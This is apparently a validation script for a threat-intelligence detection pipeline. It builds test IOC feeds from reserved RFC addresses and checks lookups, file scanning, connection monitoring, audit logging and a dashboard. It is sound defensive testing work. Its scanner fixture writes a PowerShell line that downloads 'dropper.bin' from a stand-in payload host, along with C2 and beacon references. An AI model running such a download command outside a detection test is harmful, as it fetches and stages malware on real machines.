"""Validation end-to-end du pipeline threat intel (Phases 3.d → 3.h).

Valide la chaîne complète, avec de VRAIS composants (pas de mocks de la
logique métier) :

  1. Feeds      — écrit des feeds au format EXACT des updaters
                  (URLhaus + ThreatFox + MalwareBazaar)
  2. IOCLookup  — chargement, lookups hash/host/ip/url, parent-domain
  3. feed_age   — fraicheur (frais + détection stale réelle)
  4. Sentinel   — NetworkSentinel détecte les IOCs dans un fichier réel
  5. Monitor    — VRAIE connexion socket sortante observée par psutil et
                  matchée contre le feed (best-effort ; SKIP si offline)
  6. Service    — NetworkMonitorService.on_match → audit immuable +
                  notification (chaîne SHA-256 vérifiée intègre)
  7. Reload     — maybe_reload() prend en compte de nouveaux IOCs
  8. Dashboard  — DashboardData reflète l'état audit + intel

Utilise des IOCs de TEST réservés par la RFC, jamais de vraies cibles :
  - IPs : RFC 5737 (203.0.113.0/24, 198.51.100.0/24, 192.0.2.0/24)
  - Domaines : RFC 2606 (.test, .example)

Chaque étape imprime PASS/FAIL. Exit 0 si toutes les étapes critiques
passent (l'étape 5 peut être SKIP si pas de réseau — ce n'est pas un
échec, mais c'est signalé explicitement, jamais masqué).
"""

from __future__ import annotations

import json
import shutil
import socket
import sys
from collections import namedtuple
from datetime import datetime, timedelta
from pathlib import Path
from unittest.mock import patch

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "src"))

# IOCs de test RFC. JAMAIS de vraies cibles malveillantes.
TEST_IP_C2 = "203.0.113.10"  # RFC 5737 TEST-NET-3
TEST_IP_C2_PORT = "203.0.113.10:8443"
TEST_IP_BOTNET = "198.51.100.20"  # RFC 5737 TEST-NET-2
TEST_DOMAIN = "evil-c2.test"  # RFC 2606
TEST_SUBDOMAIN = "panel.evil-c2.test"
TEST_URL = "http://payload-host.test/dropper.bin"
TEST_URL_HOST = "payload-host.test"
TEST_HASH_SHA256 = "deadbeef" * 8  # 64 hex chars
TEST_BENIGN_IP = "192.0.2.99"  # RFC 5737 TEST-NET-1, PAS dans le feed


class Stage:
    """Petit accumulateur de résultats de validation."""

    def __init__(self):
        self.results: list[tuple[str, str, str]] = []  # (name, status, detail)

    def add(self, name: str, ok: bool | None, detail: str = "") -> None:
        status = "PASS" if ok else ("SKIP" if ok is None else "FAIL")
        self.results.append((name, status, detail))
        symbol = {"PASS": "[OK]  ", "FAIL": "[FAIL]", "SKIP": "[SKIP]"}[status]
        print(f"  {symbol} {name}" + (f" — {detail}" if detail else ""))

    @property
    def failed(self) -> bool:
        return any(s == "FAIL" for _, s, _ in self.results)

    def count(self, status: str) -> int:
        return sum(1 for _, s, _ in self.results if s == status)


def _write_feeds(db: Path, *, ts: datetime | None = None) -> None:
    """Écrit les 3 feeds au format EXACT produit par les updaters."""
    ts = ts or datetime.now()
    ts_iso = ts.isoformat()

    # --- MalwareBazaar : hashes/signatures.json ---
    hashes = db / "hashes"
    hashes.mkdir(parents=True, exist_ok=True)
    (hashes / "signatures.json").write_text(
        json.dumps(
            {
                TEST_HASH_SHA256: {
                    "family": "TestDropper",
                    "source": "abuse.ch/MalwareBazaar",
                    "first_seen": ts_iso,
                    "tags": ["test", "dropper"],
                }
            }
        ),
        encoding="utf-8",
    )
    (hashes / "last_update.txt").write_text(ts_iso, encoding="utf-8")

    # --- URLhaus : urlhaus/{urls,hostnames}.json ---
    uh = db / "urlhaus"
    uh.mkdir(parents=True, exist_ok=True)
    (uh / "urls.json").write_text(
        json.dumps(
            [
                {
                    "url_id": "1",
                    "url": TEST_URL,
                    "hostname": TEST_URL_HOST,
                    "date_added": ts_iso,
                    "url_status": "online",
                    "threat": "malware_download",
                    "tags": ["test"],
                    "reporter": "validation",
                }
            ]
        ),
        encoding="utf-8",
    )
    (uh / "hostnames.json").write_text(
        json.dumps({TEST_URL_HOST: [TEST_URL]}), encoding="utf-8"
    )
    (uh / "last_update.txt").write_text(ts_iso, encoding="utf-8")

    # --- ThreatFox : threatfox/by_type/*.json + iocs.json ---
    tf = db / "threatfox"
    bt = tf / "by_type"
    bt.mkdir(parents=True, exist_ok=True)
    (bt / "ip.json").write_text(
        json.dumps(
            {
                TEST_IP_C2_PORT: {
                    "malware": "TestRAT",
                    "threat_type": "c2_server",
                    "confidence": 100,
                    "source": "abuse.ch/ThreatFox",
                    "first_seen": ts_iso,
                    "tags": ["test", "c2"],
                },
                f"{TEST_IP_BOTNET}:80": {
                    "malware": "TestBotnet",
                    "threat_type": "botnet_cc",
                    "confidence": 85,
                    "source": "abuse.ch/ThreatFox",
                    "first_seen": ts_iso,
                    "tags": ["test"],
                },
            }
        ),
        encoding="utf-8",
    )
    (bt / "domain.json").write_text(
        json.dumps(
            {
                TEST_DOMAIN: {
                    "malware": "TestRAT",
                    "threat_type": "c2_server",
                    "confidence": 90,
                    "source": "abuse.ch/ThreatFox",
                }
            }
        ),
        encoding="utf-8",
    )
    (tf / "iocs.json").write_text(
        json.dumps([{"id": "1"}, {"id": "2"}, {"id": "3"}]), encoding="utf-8"
    )
    (tf / "last_update.txt").write_text(ts_iso, encoding="utf-8")


def main() -> int:
    workdir = ROOT / "validation_intel_workdir"
    if workdir.exists():
        shutil.rmtree(workdir)
    workdir.mkdir(parents=True)
    db = workdir / "db" / "signatures"

    st = Stage()
    print("=" * 72)
    print("Validation pipeline threat intel — Phases 3.d → 3.h")
    print("=" * 72)

    # ----- Étape 1 : Feeds -----
    print("\n[1] Écriture des feeds (format updater réel)")
    _write_feeds(db)
    feeds_ok = (
        (db / "hashes" / "signatures.json").exists()
        and (db / "urlhaus" / "hostnames.json").exists()
        and (db / "threatfox" / "by_type" / "ip.json").exists()
    )
    st.add("Feeds écrits (MB + URLhaus + ThreatFox)", feeds_ok)

    # ----- Étape 2 : IOCLookup -----
    print("\n[2] IOCLookup — chargement + lookups")
    from biocybe.intel.ioc_lookup import IOCLookup

    lookup = IOCLookup.from_db(db)
    st.add("Lookup chargé (total > 0)", lookup.total > 0, f"{lookup.total} IOCs")
    st.add("lookup_hash(sha256)", lookup.lookup_hash(TEST_HASH_SHA256) is not None)
    st.add("lookup_ip(ip:port)", lookup.lookup_ip(TEST_IP_C2_PORT) is not None)
    st.add(
        "lookup_ip(ip sans port)",
        lookup.lookup_ip(TEST_IP_C2) is not None,
        "fallback sans port",
    )
    st.add("lookup_hostname(domain)", lookup.lookup_hostname(TEST_DOMAIN) is not None)
    sub_hit = lookup.lookup_hostname(TEST_SUBDOMAIN)
    st.add(
        "parent-domain fallback (sous-domaine)",
        sub_hit is not None and sub_hit.metadata.get("matched_parent_domain") == TEST_DOMAIN,
    )
    st.add("lookup_url(url exacte)", lookup.lookup_url(TEST_URL) is not None)
    st.add(
        "lookup_auto(ip) bien typé",
        getattr(lookup.lookup_auto(TEST_IP_C2), "ioc_type", None) == "ip",
    )
    st.add(
        "IP bénigne NON détectée (pas de FP)",
        lookup.lookup_ip(TEST_BENIGN_IP) is None,
    )

    # ----- Étape 3 : feed_age -----
    print("\n[3] feed_age — fraicheur + détection stale")
    from biocybe.intel.feed_age import read_feed_ages

    report_fresh = read_feed_ages(db, stale_threshold_s=48 * 3600)
    st.add("Feeds frais (aucun stale)", not report_fresh.any_stale)
    st.add("ioc_count > 0 par feed", all(f.ioc_count > 0 for f in report_fresh.feeds))

    # Réécrit avec un vieux timestamp → doit devenir stale
    _write_feeds(db, ts=datetime.now() - timedelta(days=5))
    report_stale = read_feed_ages(db, stale_threshold_s=48 * 3600)
    st.add("Détection stale (feeds vieux de 5j)", report_stale.any_stale)
    # Remet des feeds frais pour la suite
    _write_feeds(db)

    # ----- Étape 4 : NetworkSentinel (fichier) -----
    print("\n[4] NetworkSentinel — IOCs dans le contenu d'un fichier")
    from biocybe.network_sentinel import NetworkSentinel

    sentinel = NetworkSentinel.from_db(db)
    sample = workdir / "suspicious.ps1"
    sample.write_text(
        f"$c2='{TEST_IP_C2_PORT}'\n"
        f"Invoke-WebRequest {TEST_URL} -OutFile p.bin\n"
        f"# beacon to {TEST_DOMAIN}\n"
        f"$hash='{TEST_HASH_SHA256}'\n"
        f"# legit call to 192.0.2.99 (benign)\n",
        encoding="utf-8",
    )
    res = sentinel.scan_file(sample)
    found_types = {h.ioc_type for h in res.iocs_found}
    st.add("Sentinel détecte des IOCs", res.is_malicious, f"{len(res.iocs_found)} hits")
    st.add("Sentinel : IP détectée", "ip" in found_types)
    st.add("Sentinel : URL détectée", "url" in found_types)
    st.add("Sentinel : hash détecté", "hash" in found_types)
    benign = workdir / "clean.txt"
    benign.write_text("Rien de suspect ici. Juste 192.0.2.99 (test-net benin).", encoding="utf-8")
    st.add("Sentinel : fichier bénin NON flaggé", not sentinel.scan_file(benign).is_malicious)

    # ----- Étape 5 : NetworkMonitor (VRAIE connexion socket) -----
    print("\n[5] NetworkMonitor — vraie connexion sortante observée par psutil")
    from biocybe.network_monitor import NetworkMonitor

    # On ajoute l'IP de test au feed, puis on tente une vraie connexion
    # vers une IP publique stable (Cloudflare 1.1.1.1:443) qu'on ajoute
    # AUSSI au feed. psutil doit observer la connexion réelle.
    real_target_ip = "1.1.1.1"
    real_target_port = 443
    bt = db / "threatfox" / "by_type"
    ip_map = json.loads((bt / "ip.json").read_text(encoding="utf-8"))
    ip_map[f"{real_target_ip}:{real_target_port}"] = {
        "malware": "ValidationTarget",
        "threat_type": "c2_server",
        "confidence": 100,
        "source": "validation/RFC-test",
    }
    (bt / "ip.json").write_text(json.dumps(ip_map), encoding="utf-8")
    lookup_live = IOCLookup.from_db(db)
    monitor_live = NetworkMonitor(lookup_live)

    sock = None
    try:
        sock = socket.create_connection((real_target_ip, real_target_port), timeout=4)
        records = monitor_live.snapshot()
        hit_live = [
            r for r in records if r.is_malicious and r.remote_ip == real_target_ip
        ]
        if hit_live:
            st.add(
                "Connexion réelle détectée par snapshot",
                True,
                f"pid={hit_live[0].pid} -> {hit_live[0].raddr}",
            )
        else:
            # La connexion existe mais psutil ne l'a pas attribuée (timing,
            # ou perms). On ne masque pas : on signale SKIP avec raison.
            st.add(
                "Connexion réelle détectée par snapshot",
                None,
                "connexion ouverte mais non vue par psutil (timing/perms) — détection testée en [6]",
            )
    except OSError as exc:
        st.add(
            "Connexion réelle détectée par snapshot",
            None,
            f"pas de réseau ({exc}) — détection testée via on_match en [6]",
        )
    finally:
        if sock is not None:
            sock.close()

    # ----- Étape 6 : NetworkMonitorService.on_match → audit + notify -----
    print("\n[6] NetworkMonitorService — on_match → audit immuable + notify")
    import argparse

    from biocybe.audit import AuditLog, set_default
    from biocybe.cli import _build_network_monitor_service_from_config

    audit_path = workdir / "logs" / "audit.jsonl"
    set_default(AuditLog(audit_path))

    captured_events: list = []

    class CapturingMgr:
        def notify(self, event):
            captured_events.append(event)

    args = argparse.Namespace(netmon=True, netmon_interval=2.0)
    service = _build_network_monitor_service_from_config(
        {"netmon": {"db_path": str(db)}}, CapturingMgr(), cli_args=args
    )
    st.add("Service construit (enabled via CLI)", service is not None)

    # Construit un ConnectionRecord réel à partir d'un hit du lookup
    FakeAddr = namedtuple("FakeAddr", ["ip", "port"])
    FakeConn = namedtuple("FakeConn", ["laddr", "raddr", "status", "pid"])
    fake_conn = FakeConn(
        laddr=FakeAddr("10.0.0.5", 50000),
        raddr=FakeAddr(TEST_IP_C2, 8443),
        status="ESTABLISHED",
        pid=9999,
    )
    with patch("psutil.net_connections", return_value=[fake_conn]):
        with patch(
            "biocybe.network_monitor._safe_process_info",
            return_value=("malware.exe", "C:\\Users\\test\\malware.exe"),
        ):
            recs = service.monitor.snapshot()
            mal = [r for r in recs if r.is_malicious]
            st.add("snapshot détecte l'IOC de test", len(mal) == 1)
            if mal:
                service.monitor.on_match(mal[0])

    # Vérifie l'audit
    log_check = AuditLog(audit_path)
    entries = log_check.read_all()
    net_entries = [e for e in entries if e.action == "network_ioc_detected"]
    st.add("Audit : entrée network_ioc_detected écrite", len(net_entries) == 1)
    if net_entries:
        d = net_entries[0].details
        st.add(
            "Audit : détails corrects (malware + process)",
            d.get("malware") == "TestRAT" and d.get("process_name") == "malware.exe",
        )
    chain_ok, chain_errors = log_check.verify()
    st.add("Audit : chaîne SHA-256 intègre", chain_ok, "" if chain_ok else str(chain_errors[:2]))

    # Vérifie la notification (conf 100 → critical)
    st.add("Notify : 1 event émis", len(captured_events) == 1)
    if captured_events:
        st.add(
            "Notify : sévérité critical (conf 100)",
            captured_events[0].severity.value == "critical",
        )

    # ----- Étape 7 : maybe_reload -----
    print("\n[7] NetworkMonitorService.maybe_reload — prise en compte des nouveaux IOCs")
    before_total = service.ioc_total
    new_ip = "198.51.100.55:443"
    ip_map = json.loads((bt / "ip.json").read_text(encoding="utf-8"))
    ip_map[new_ip] = {"malware": "FreshIOC", "confidence": 95, "source": "validation"}
    (bt / "ip.json").write_text(json.dumps(ip_map), encoding="utf-8")
    # Bump du timestamp pour changer le fingerprint
    (db / "threatfox" / "last_update.txt").write_text(
        datetime.now().isoformat(), encoding="utf-8"
    )
    reloaded = service.maybe_reload()
    st.add("maybe_reload détecte le changement", reloaded)
    st.add("Nouveaux IOCs chargés", service.ioc_total > before_total)
    st.add(
        "Monitor voit le nouvel IOC après reload",
        service.monitor.lookup.lookup_ip("198.51.100.55") is not None,
    )
    st.add("maybe_reload no-op si inchangé", service.maybe_reload() is False)

    # ----- Étape 8 : DashboardData -----
    print("\n[8] DashboardData — reflète l'état audit + intel")
    from biocybe.dashboard.data import DashboardConfig, DashboardData

    dcfg = DashboardConfig(
        quarantine_dir=str(workdir / "quarantine"),
        audit_path=str(audit_path),
        signatures_db_path=str(db),
    )
    data = DashboardData(dcfg)
    intel = data.intel_summary()
    audit_s = data.audit_summary()
    overview = data.overview()
    st.add("Dashboard : intel_total > 0", intel["lookup_total"] > 0)
    st.add("Dashboard : audit reflète les events", audit_s["total"] >= 1)
    st.add("Dashboard : chaîne audit OK", audit_s["chain_ok"] is True)
    st.add(
        "Dashboard : action network_ioc_detected visible",
        "network_ioc_detected" in audit_s["by_action"],
    )
    st.add(
        "Dashboard : overview cohérent",
        overview["intel_total_iocs"] == intel["lookup_total"],
    )

    set_default(None)  # cleanup

    # ----- Verdict -----
    print("\n" + "=" * 72)
    print(
        f"VÉRIFICATIONS : {st.count('PASS')} PASS · "
        f"{st.count('FAIL')} FAIL · {st.count('SKIP')} SKIP"
    )
    print("=" * 72)

    # Nettoyage du workdir (on garde rien — pas de pollution du repo)
    shutil.rmtree(workdir, ignore_errors=True)

    if st.failed:
        print("VERDICT : FAIL")
        for name, status, detail in st.results:
            if status == "FAIL":
                print(f"  - {name} : {detail}")
        return 1
    if st.count("SKIP"):
        print("VERDICT : PASS (avec étapes SKIP — voir détails ci-dessus)")
    else:
        print("VERDICT : PASS")
    return 0


if __name__ == "__main__":
    sys.exit(main())
